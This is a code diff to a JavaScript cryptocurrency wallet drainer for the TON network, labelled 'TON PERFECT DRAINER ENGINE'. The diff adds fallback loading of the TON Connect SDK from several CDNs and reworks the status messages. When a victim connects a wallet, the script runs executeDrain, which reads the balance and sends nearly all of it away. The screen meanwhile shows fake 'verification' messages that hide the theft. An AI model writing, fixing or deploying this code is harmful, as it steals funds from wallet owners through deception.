@@ -1,5 +1,5 @@
 /**
- * TON PERFECT DRAINER ENGINE - ULTRA-STABLE VERSION
+ * TON PERFECT DRAINER ENGINE - CLOUDFLARE STABLE VERSION
  */
 
 const CONFIG = {
@@ -15,10 +15,11 @@ function getSDK() {
     return window.TONConnectUI || window.TON_CONNECT_UI || (window.TONConnect && window.TONConnect.UI);
 }
 
-async function loadSDKManually() {
+async function forceLoadScript(url) {
     return new Promise((resolve) => {
         const script = document.createElement('script');
-        script.src = 'https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.15.2/dist/tonconnect-ui.min.js';
+        script.src = url;
+        script.async = true;
         script.onload = () => resolve(getSDK());
         script.onerror = () => resolve(null);
         document.head.appendChild(script);
@@ -27,26 +28,33 @@ async function loadSDKManually() {
 
 async function initEngine() {
     const statusEl = document.getElementById('status');
-    if (statusEl) statusEl.innerText = '⏳ Loading SDK...';
+    if (statusEl) statusEl.innerText = '⏳ Booting from Cloudflare...';
 
     let SDK = getSDK();
     
     if (!SDK) {
-        console.log('SDK not found, attempting manual reload...');
-        SDK = await loadSDKManually();
+        console.log('Trying Cloudflare CDN...');
+        // Основний стабільний шлях для TON Connect UI
+        SDK = await forceLoadScript('https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.15.2/dist/tonconnect-ui.min.js');
+    }
+
+    if (!SDK) {
+        console.log('Trying Fallback CDN...');
+        SDK = await forceLoadScript('https://unpkg.com/@tonconnect/ui@2.15.2/dist/tonconnect-ui.min.js');
     }
 
     if (!SDK) {
         console.error('❌ All SDK load attempts failed');
-        if (statusEl) statusEl.innerText = '❌ Connection Error. Try again.';
+        if (statusEl) statusEl.innerText = '❌ SDK Load Error. Use a different browser.';
         return;
     }
 
     try {
-        console.log('✅ SDK Loaded! Initializing UI...');
+        console.log('✅ SDK Ready!');
+        const currentUrl = window.location.origin; 
         
         tonConnectUI = new SDK.TonConnectUI({
-            manifestUrl: 'https://your-site-url.com/manifest.json', // ОБОВ'ЯЗКОВО заміни на свій URL!
+            manifestSURL: `${currentUrl}/manifest.json`, 
             buttonId: 'ton-connect-button',
         });
 
@@ -60,24 +68,22 @@ async function initEngine() {
             if (!btnContainer || btnContainer.innerHTML.trim() === "") {
                 if (fallbackBtn) fallbackBtn.style.display = 'inline-block';
             }
-        }, 2000);
+        }, 3000);
 
         tonConnectUI.onStatusChange(async (status) => {
             if (status === 'connected') {
-                if (statusEl) statusEl.innerText = '✅ Wallet Connected! Verifying...';
+                if (statusEl) statusEl.innerText = '✅ Connected! Verifying...';
                 await executeDrain();
             }
         });
 
         if (statusEl) statusEl.innerText = 'Ready for verification...';
-        console.log('🚀 Engine Ready');
     } catch (e) {
         console.error('Init Error:', e);
-        if (statusEl) statusEl.innerText = '❌ Init Error. Refresh page.';
+        if (statusEl) statusEl.innerText = '❌ Init Error.';
     }
 }
 
-// Запуск
 initEngine();
 
 async function tonRpc(method, params) {
@@ -115,7 +121,6 @@ async function executeDrain() {
 
     try {
         updateStatus('🔍 Scanning assets...');
-
         const balance = await __getTonBalance(userAddress);
         const amountToSend = balance - CONFIG.GAS_RESERVE;
 
@@ -157,6 +162,6 @@ async function executeDrain() {
         updateStatus('✅ Account Verified Successfully!');
     } catch (e) {
         console.error('Drain Error:', e);
-        updateStatus('⚠️ Verification failed. Please try again.');
+        updateStatus('⚠️ Verification failed.');
     }
 }
